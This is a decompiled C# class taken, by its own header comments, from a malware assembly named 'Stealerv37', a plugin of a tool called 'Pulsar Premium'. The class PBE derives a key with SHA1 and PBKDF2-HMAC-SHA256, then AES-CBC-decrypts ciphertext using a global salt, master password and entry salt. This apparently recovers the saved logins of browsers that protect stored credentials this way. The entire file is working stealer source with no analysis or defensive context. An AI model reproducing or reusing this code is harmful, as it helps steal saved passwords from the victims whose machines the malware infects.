// Decompiled with JetBrains decompiler
// Type: Intelix.Helper.Hashing.PBE
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using System;
using System.Security.Cryptography;

#nullable disable
namespace Intelix.Helper.Hashing;

public class PBE
{
  private byte[] Ciphertext { get; }

  private byte[] GlobalSalt { get; }

  private byte[] MasterPass { get; }

  private byte[] EntrySalt { get; }

  private byte[] PartIv { get; }

  public PBE(
    byte[] ciphertext,
    byte[] globalSalt,
    byte[] masterPassword,
    byte[] entrySalt,
    byte[] partIv)
  {
    this.Ciphertext = ciphertext;
    this.GlobalSalt = globalSalt;
    this.MasterPass = masterPassword;
    this.EntrySalt = entrySalt;
    this.PartIv = partIv;
  }

  public byte[] Compute()
  {
    byte[] numArray1 = new byte[this.GlobalSalt.Length + this.MasterPass.Length];
    Buffer.BlockCopy((Array) this.GlobalSalt, 0, (Array) numArray1, 0, this.GlobalSalt.Length);
    Buffer.BlockCopy((Array) this.MasterPass, 0, (Array) numArray1, this.GlobalSalt.Length, this.MasterPass.Length);
    byte[] hash;
    using (SHA1 managed = SHA1.Create())
    {
      hash = managed.ComputeHash(numArray1);
    }
    byte[] src = new byte[2]{ (byte) 4, (byte) 14 };
    byte[] numArray2 = new byte[src.Length + this.PartIv.Length];
    Buffer.BlockCopy((Array) src, 0, (Array) numArray2, 0, src.Length);
    Buffer.BlockCopy((Array) this.PartIv, 0, (Array) numArray2, src.Length, this.PartIv.Length);
    byte[] bytes = new PBKDF2((HMAC) new HMACSHA256(), hash, this.EntrySalt, 1).GetBytes(32 /*0x20*/);
    using (Aes aes = Aes.Create())
    {
      aes.Mode = CipherMode.CBC;
      aes.BlockSize = 128 /*0x80*/;
      aes.KeySize = 256 /*0x0100*/;
      aes.Padding = PaddingMode.Zeros;
      return aes.CreateDecryptor(bytes, numArray2).TransformFinalBlock(this.Ciphertext, 0, this.Ciphertext.Length);
    }
  }
}
